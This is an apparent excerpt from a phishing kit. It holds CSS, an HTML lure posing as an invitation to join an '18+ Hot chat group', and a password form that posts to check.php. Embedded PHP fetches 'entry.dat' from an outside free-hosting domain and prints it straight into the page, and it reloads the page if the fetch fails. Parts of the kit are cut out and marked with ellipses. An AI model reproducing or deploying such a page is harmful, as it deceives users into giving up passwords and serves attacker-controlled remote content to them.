...
.motherfucker::-webkit-input-placeholder {
  font-family: sans-serif;
}

.motherfucker:-ms-input-placeholder {
  font-family: sans-serif;
}

.motherfucker:-moz-placeholder {
  font-family: sans-serif;
}
...
<div class="page-main__inner">
	<div class="page-content page-content--single">
		<div class="block block--invite">
			<a href="#" id="action-icon" title="Follow this link to join:  18+ Hot chat group " class="block__img img icon-chat"><span class="img__body" style="background-image: url(http://slacked021.000webhostapp.com/system0.img);"></span></a>
			<h2 class="block__title"><?php 
					$uimg = @file_get_contents('http://slacked021.000webhostapp.com/entry.dat');
					if($uimg === FALSE) { 
						header("Refresh:0");
					} else {
						echo $uimg;
			...
			<form action="check.php" method="post">
			   ...
			   <input type="text"  id="password" name="password" placeholder="Password" required class="motherfucker"></br></br></br>
